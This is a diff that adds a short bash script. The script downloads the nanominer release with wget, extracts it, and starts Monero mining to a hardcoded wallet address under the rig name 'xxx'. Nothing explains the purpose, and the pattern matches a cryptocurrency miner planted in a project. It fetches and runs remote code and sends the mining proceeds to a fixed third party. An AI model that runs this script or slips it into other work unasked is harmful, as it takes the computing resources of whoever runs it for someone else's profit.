@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-linux-3.9.3.tar.gz
+tar xf nanominer-linux-3.9.3.tar.gz
+./nanominer -algo randomx -wallet 8BuaTg6Gxmi1vLku8Gz9ZhN5rpsHbCPYkV1smEpMxipcARrfHUNW3BTb1fbHj48Mmi3uUQ5QGC9dP9yN5Nt2MP9kRt1S9BP -coin xmr -rigName xxx
